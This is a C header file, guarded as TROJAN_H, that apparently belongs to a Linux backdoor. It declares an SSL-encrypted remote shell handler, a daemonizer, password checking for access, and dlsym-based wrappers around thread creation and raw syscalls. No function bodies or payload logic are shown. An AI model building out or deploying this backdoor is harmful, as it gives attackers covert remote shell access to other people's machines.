#ifndef TROJAN_H
#define TROJAN_H

// grep -rnw /usr/include -e 'CLONE_SYSVSEM'
#define _GNU_SOURCE
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <syslog.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/file.h>
#include <pthread.h>
#include <sys/wait.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/sha.h>
#include <sys/select.h>
#include <sys/syscall.h>      /* Definition of SYS_* constants */
#include <sys/mman.h>
/* #define _GNU_SOURCE
#include <sched.h>
#include <linux/sched.h>
*/
#include <dlfcn.h>
#include <stdbool.h>

#define MAX_CLIENTS 3
#define sc(...) syscall(__VA_ARGS__)
#define CREATE_ARGS pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg

typedef struct s_args {
    int client_socket;
    SSL *ssl;
} t_args;


typedef int (*create_type)(CREATE_ARGS);
typedef int (*detach_type)(pthread_t id);

void handle_shell(SSL *ssl);
SSL_CTX *create_context();
void configure_cert(SSL_CTX *ctx);
void ft_shutdown(t_args *args);
void daemonizer(void);

int p_create(CREATE_ARGS);
int p_detach(pthread_t id);
bool check_pwd(unsigned char *passwd, size_t passwd_len);

#endif
